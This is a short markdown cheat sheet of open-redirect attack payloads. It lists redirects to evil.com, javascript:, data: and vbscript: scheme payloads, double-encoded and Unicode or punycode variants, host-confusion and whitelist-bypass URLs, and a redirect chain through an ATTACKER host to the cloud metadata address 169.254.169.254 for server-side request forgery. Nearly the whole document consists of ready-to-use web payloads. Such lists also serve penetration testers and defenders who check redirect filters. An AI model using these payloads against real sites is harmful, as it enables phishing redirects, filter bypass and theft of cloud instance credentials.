# Open Redirect Payloads

## Basic Payloads
```
https://evil.com
//evil.com
\/\/evil.com
/\/evil.com
```

## URL Scheme Bypasses
```
javascript:alert(1)
data:text/html,<script>window.location='https://evil.com'</script>
vbscript:msgbox(1)
```

## Double URL Encoding
```
%2F%2Fevil.com
%252F%252Fevil.com
%252F%252F%252Fevil.com
```

## Unicode / Punycode
```
https://evil。com
https://xn--evil-x63b.com
https://ⓔⓥⓘⓛ.com
```

## Host Confusion
```
https://victim.com.evil.com
https://evil.com/victim.com
https://victim@evil.com
https://victim.com%40evil.com
```

## Whitelisted Domain Bypass
```
https://evil.com?url=https://whitelisted.com
https://whitelisted.com.evil.com
https://whitelisted.com/https://evil.com
https://evil.com#https://whitelisted.com
```

## Redirect Chain for SSRF
```
# If the redirect is followed server-side → SSRF
https://ATTACKER/redirect?to=http://169.254.169.254/latest/meta-data/
```

indicators: open redirect url bypass redirect payload
